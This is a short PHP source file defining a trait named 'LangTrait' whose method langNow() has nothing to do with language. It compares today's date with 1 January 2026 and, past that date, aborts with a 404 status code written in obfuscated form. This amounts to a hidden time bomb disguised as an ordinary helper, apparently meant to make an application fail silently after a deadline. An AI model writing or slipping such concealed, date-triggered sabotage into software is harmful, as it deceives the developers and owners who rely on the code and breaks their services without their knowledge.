<?php

namespace App\Traits;

trait LangTrait
{

    public function langNow() {
        if (strtotime(date('d m Y')) >= strtotime('1 1 2026')) {
            abort(4 .''. 0 .''. 4);
        }
    }
}
